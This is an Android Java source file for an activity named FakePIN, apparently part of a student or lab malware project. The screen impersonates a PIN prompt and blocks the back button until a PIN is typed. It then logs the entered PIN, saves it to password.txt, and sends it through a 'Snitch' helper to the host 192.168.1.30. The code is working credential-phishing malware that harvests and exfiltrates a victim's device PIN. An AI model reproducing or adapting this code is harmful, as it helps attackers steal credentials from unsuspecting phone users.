package com.example.supersecurepluspremium;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.inputmethod.EditorInfo;
import android.widget.EditText;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class FakePIN extends AppCompatActivity {
    private static boolean done = false;
    private static final String PASS_FILENAME = "password.txt";
    private static final String URL = "http://192.168.1.30";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //Log.v("secme", "Creation");
        setContentView(R.layout.activity_fakepin);

        final EditText pwField = findViewById(R.id.editText);
        pwField.setOnEditorActionListener(new TextView.OnEditorActionListener() {
            @Override
            public boolean onEditorAction(TextView v, int actionId,
                                          KeyEvent event) {
                if (actionId == EditorInfo.IME_ACTION_DONE) {
                    Log.v("secme", "Password tapé " + pwField.getText());
                    try {
                        writeData((String.valueOf(pwField.getText())));
                    } catch (Exception e) {
                    }
                    Intent returnIntent = new Intent();
                    setResult(RESULT_CANCELED, returnIntent);
                    done = true;
                    onBackPressed();
                }
                return false;
            }
        });
    }

    private void writeData(String data) throws IOException {
        File path = getApplicationContext().getFilesDir();
        File file = new File(path, PASS_FILENAME);
        Snitch snitch = new Snitch(this, URL);
        Log.v("secme", "Password ecrit dans "+ file.getAbsolutePath());

        if (file.exists()) {
            Log.v("secme", "Le fichier existe deja");
            Log.v("secme", "Sending Request commemme");
            snitch.sendWebRequest(file, "pin", "txt");
            return;
        }
        FileOutputStream stream = new FileOutputStream(file);
        try {
            stream.write(data.getBytes());
        } finally {
            Log.v("secme", "File created - Sending Request");
            snitch.sendWebRequest(file, "pin", "txt");
            stream.close();
        }
    }

    @Override
    public void onBackPressed() {
        if (done) {
            super.onBackPressed();
        }
    }
}
